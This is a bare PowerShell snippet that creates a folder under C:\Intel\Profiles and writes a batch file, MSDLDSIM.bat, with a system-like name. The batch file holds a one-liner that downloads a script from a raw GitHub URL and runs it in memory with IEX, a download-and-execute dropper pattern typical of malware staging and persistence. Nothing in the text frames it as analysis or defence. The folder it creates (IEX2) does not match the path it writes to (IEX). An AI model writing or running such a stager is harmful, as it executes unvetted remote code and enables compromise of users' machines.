md C:\Intel\Profiles/IE/IEX2; $contentToAdd = @"
powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLDSIM.bat" $contenttoadd;
